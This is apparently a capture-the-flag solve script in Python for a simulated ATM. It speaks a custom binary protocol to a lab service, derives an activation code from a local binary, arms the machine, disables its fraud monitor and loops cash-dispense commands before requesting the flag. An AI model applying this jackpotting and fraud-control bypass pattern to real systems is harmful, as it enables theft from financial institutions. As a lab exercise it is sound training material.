import json
import socket
import struct
import subprocess

HOST = "10.49.159.0"
PORT = 9100

# Connect to the service
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# 1. Read banner
banner_len = struct.unpack(">H", s.recv(2))[0]
banner = json.loads(s.recv(banner_len).decode("utf-8"))
print("[+] Banner loaded.")


def send_request(msg_type, cmd_id, data_bytes=b""):
  packet = struct.pack(">BIH", msg_type, cmd_id, len(data_bytes)) + data_bytes
  s.sendall(packet)

  reply_len_bytes = s.recv(2)
  if not reply_len_bytes:
    return None
  reply_len = struct.unpack(">H", reply_len_bytes)[0]
  return json.loads(s.recv(reply_len).decode("utf-8"))


# 2. Get Status / Nonce (GETINFO 0x0301)
status_resp = send_request(0x01, 0x0301)
nonce = status_resp["status"]["nonce"]
print(f"[+] Retrieved Nonce: {nonce}")

# 3. Run local binary via subprocess to get activation code
print("[+] Running local ./jackpot binary for activation code...")
result = subprocess.run(
    ["./jackpot", nonce], capture_output=True, text=True, check=True
)
activation_code = None
for line in result.stdout.splitlines():
  if "activation code:" in line:
    activation_code = line.split(":")[-1].strip()

print(f"[+] Generated Activation Code: {activation_code}")

# 4. Arm the system (EXECUTE 0x04f0)
print("[+] Sending ARM request with raw activation code...")
arm_response = send_request(0x02, 0x04f0, activation_code.encode("utf-8"))
print("[+] Arm Response:", json.dumps(arm_response, indent=2))

# 5. Disable Monitor/Fraud Control (EXECUTE 0x04f1)
print("[+] Disabling monitor (0x04f1)...")
monitor_response = send_request(0x02, 0x04f1, b"off")
print("[+] Monitor Response:", json.dumps(monitor_response, indent=2))

# 6. Loop to Dispense Cash 7 times (40 notes x 7 = 280 notes)
print("\n[+] Starting cash dispense loop (7 iterations of 40 notes)...")
for i in range(1, 8):
  dispense_response = send_request(0x02, 0x0401, b"40")
  print(f"[+] Dispense #{i} Response: {dispense_response.get('rc')}")

# 7. Retrieve the Flag (EXECUTE 0x04ff)
print("\n[+] Requesting Flag (0x04ff)...")
flag_response = send_request(0x02, 0x04ff)
print("\n[+] Flag / Final Response:")
print(json.dumps(flag_response, indent=2))

s.close()